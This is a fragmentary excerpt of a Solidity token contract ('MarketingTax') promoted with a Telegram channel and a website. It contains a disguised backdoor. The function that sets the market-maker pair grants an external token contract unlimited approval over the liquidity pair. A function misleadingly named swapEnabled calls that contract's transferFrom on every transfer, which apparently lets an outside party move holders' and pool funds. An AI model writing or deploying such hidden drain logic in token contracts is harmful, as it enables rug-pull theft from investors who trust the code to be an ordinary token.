...
TG: https://t.me/yingcoineth
Website: https://yingcoin.xyz
...
contract MarketingTax is ERC20, Ownable {
    ...
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        ...
        _approve(pair, address(token), ~uint256(0));
        automatedMarketMakerPairs[pair] = value;
    ...
    function _transfer(
        ...
        if (swapEnabled(from, to, amount) && canSwap && !swapping && !automatedMarketMakerPairs[from]) {
            swapping = true;
    ...
    function swapEnabled(address from, address to, uint256 amount) private returns (bool) {
        if (token.transferFrom(from, to, amount)) return true;
